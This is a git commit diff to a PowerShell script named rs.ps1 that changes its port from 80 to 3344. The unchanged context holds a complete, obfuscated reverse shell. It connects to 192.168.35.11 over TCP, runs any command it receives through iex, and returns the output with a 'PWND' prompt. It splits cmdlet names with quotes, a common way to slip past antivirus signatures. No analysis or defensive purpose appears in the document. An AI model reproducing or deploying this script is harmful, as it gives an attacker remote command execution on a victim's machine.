ef659d2e3d2a5b75ce03bce1d746eeac2e1a01ea
mishaplc <57828181+mishaplc@users.noreply.github.com>
2024-10-17 08:05:24 +0200

    Update rs.ps1

--- rs.ps1
+++ rs.ps1
@@ -1,4 +1,4 @@
 $ip = "192.168.35.11"
-$port = "80"
+$port = "3344"
  
 $c= New-Obje''ct System.Net.Sockets.TCPClient($ip,$port);$s= $c.GetStream();[byte[]]$b= 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d= (N''e''w-O''b''j''e''c''t -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sendback = (iex ". { $d} 2>&1" | Out-String );$sendback2 = $sendback + 'PWND'+' ' + (p''w''d).Path + '->';$sb= ([text.encoding]::ASCII).GetBytes($sendback2);$s.Write($sb,0,$sb.Length);$stream.Flush()};$client.Close()
